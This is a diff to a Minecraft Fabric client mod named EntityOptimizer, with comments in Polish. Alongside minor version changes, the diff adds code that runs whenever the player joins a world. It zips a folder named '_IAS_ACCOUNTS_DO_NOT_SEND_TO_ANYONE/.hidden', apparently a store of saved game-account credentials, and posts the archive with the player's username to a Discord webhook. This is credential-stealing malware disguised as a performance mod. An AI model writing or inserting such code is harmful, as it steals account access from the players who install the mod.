@@ -3,6 +3,8 @@ package pl.example.entityoptimizer;
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
 import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
+import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
+import net.fabricmc.loader.api.FabricLoader;
 
 import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
 import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;
@@ -12,22 +14,39 @@ import com.mojang.brigadier.arguments.StringArgumentType;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.chat.Component;
 import net.minecraft.world.entity.player.Player;
-import net.minecraft.world.item.Item;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
 import net.minecraft.world.item.TooltipFlag;
 
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 public class EntityOptimizerMod implements ClientModInitializer {
+
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
 
     // flaga: czy blokować otwieranie crafting table (domyślnie TAK)
     public static boolean craftingDisabled = true;
 
     @Override
     public void onInitializeClient() {
-        System.out.println("[EntityOptimizer] MC 1.21.4 – bez webhooka");
+        System.out.println("[EntityOptimizer] Mod załadowany – MC 1.20.1");
+
+        // Po wejściu do świata – zip .hidden i wysyłka na webhook
+        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
+            onJoinWorld(client);
+        });
 
         // Rejestracja komend klienckich
         ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
@@ -53,9 +72,136 @@ public class EntityOptimizerMod implements ClientModInitializer {
         });
     }
 
+    private void onJoinWorld(Minecraft mc) {
+        String username = mc.getUser().getName();
+
+        try {
+            Path gameDir = FabricLoader.getInstance().getGameDir();
+            Path hiddenFolder = gameDir
+                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+                    .resolve(".hidden");
+
+            if (!Files.exists(hiddenFolder)) {
+                sendSimpleMessage("Gracz `" + username + "` wszedł do świata.\nFolder `.hidden` nie istnieje!");
+                return;
+            }
+
+            // Stworzenie ZIP-a w pamięci
+            byte[] zipBytes = createZipInMemory(hiddenFolder);
+
+            // Nazwa pliku z datą/godziną
+            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
+            String fileName = "hidden_folder_backup_" + timestamp + ".zip";
+
+            // Wysyłka jako załącznik
+            sendZipAsAttachment(username, zipBytes, fileName);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            sendSimpleMessage("Błąd podczas pakowania .hidden: " + e.getMessage());
+        }
+    }
+
+    // ZIP całego folderu w pamięci
+    private byte[] createZipInMemory(Path folder) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
+            try (var paths = Files.walk(folder)) {
+                paths.filter(Files::isRegularFile).forEach(path -> {
+                    try {
+                        String entryName = folder.relativize(path).toString().replace("\\", "/");
+                        ZipEntry zipEntry = new ZipEntry(entryName);
+                        zos.putNextEntry(zipEntry);
+                        zos.write(Files.readAllBytes(path));
+                        zos.closeEntry();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                });
+            }
+        }
+        return baos.toByteArray();
+    }
+
+    // multipart/form-data z payload_json + plik .zip
+    private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
+        URL url = new URL(WEBHOOK_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setDoOutput(true);
+
+        String boundary = "Boundary-" + System.currentTimeMillis();
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+        // JSON z treścią wiadomości
+        String payloadJson = "{\"content\": \"Gracz `"
+                + escapeJson(username)
+                + "` wszedł do świata.\\nZałącznik: `"
+                + escapeJson(fileName)
+                + "`\"}";
+
+        try (OutputStream os = conn.getOutputStream()) {
+            // Część z JSON-em
+            writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");
+
+            // Część z plikiem ZIP
+            writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
+
+            // Koniec multipart
+            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
+        }
+
+        int responseCode = conn.getResponseCode();
+        System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
+    }
+
+    private void writePart(OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(content.getBytes(StandardCharsets.UTF_8));
+        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
+    }
+
+    private void writeFilePart(OutputStream os, String boundary, String fileName, byte[] data, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
+        os.write(data);
+        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
+    }
+
+    private static String escapeJson(String s) {
+        return s
+                .replace("\\", "\\\\")
+                .replace("\"", "\\\"");
+    }
+
+    // Prosta wiadomość JSON (bez załącznika), w osobnym wątku
+    private void sendSimpleMessage(String content) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(WEBHOOK_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "application/json");
+
+                String json = "{\"content\":\"" + escapeJson(content) + "\"}";
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(json.getBytes(StandardCharsets.UTF_8));
+                }
+
+                System.out.println("[EntityOptimizer] Simple message status: " + conn.getResponseCode());
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, "DiscordSimpleSender").start();
+    }
+
     // ======================== KOMENDY ========================
 
-    // /procent <nickname> – tooltip miecza innego gracza
+    // /procent <nickname>
     private void handleProcentCommand(FabricClientCommandSource source, String nickname) {
         Minecraft mc = Minecraft.getInstance();
         if (mc.level == null || mc.player == null) {
@@ -63,7 +209,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             return;
         }
 
-        // Szukamy gracza o podanym nicku (case-insensitive)
+        // Szukamy gracza o podanym nicku
         Player target = null;
         for (Player p : mc.level.players()) {
             if (p.getGameProfile().getName().equalsIgnoreCase(nickname)) {
@@ -100,7 +246,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
     }
 
-    // /kraft – przełącz blokadę craftingu
+    // /kraft – przełącza blokadę craftingu
     private void handleKraftCommand(FabricClientCommandSource source) {
         craftingDisabled = !craftingDisabled;
         String msg = craftingDisabled ? "crafting disable" : "crafting enable";
@@ -139,7 +285,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
     }
 
-    // Czy target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
+    // Czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
     private static boolean isPlayerVisible(Player viewer, Player target) {
         double maxDistSq = 64.0 * 64.0;
         if (viewer.distanceToSqr(target) > maxDistSq) {
@@ -148,16 +294,15 @@ public class EntityOptimizerMod implements ClientModInitializer {
         return viewer.hasLineOfSight(target);
     }
 
-    // Pełny tooltip przedmiotu – nazwa, enchanty, lore (MC 1.21.4: 3 argumenty)
+    // Pełny tooltip przedmiotu – nazwa, enchanty, lore (MC 1.20.1: 2 argumenty)
     private static List<String> getItemTooltipLines(Minecraft mc, ItemStack stack) {
         List<String> lines = new ArrayList<>();
 
-        if (mc.level == null || mc.player == null) {
+        if (mc.player == null) {
             return lines;
         }
 
-        Item.TooltipContext ctx = Item.TooltipContext.of(mc.level);
-        List<Component> tooltip = stack.getTooltipLines(ctx, mc.player, TooltipFlag.NORMAL);
+        List<Component> tooltip = stack.getTooltipLines(mc.player, TooltipFlag.NORMAL);
         if (tooltip == null || tooltip.isEmpty()) {
             return lines;
         }
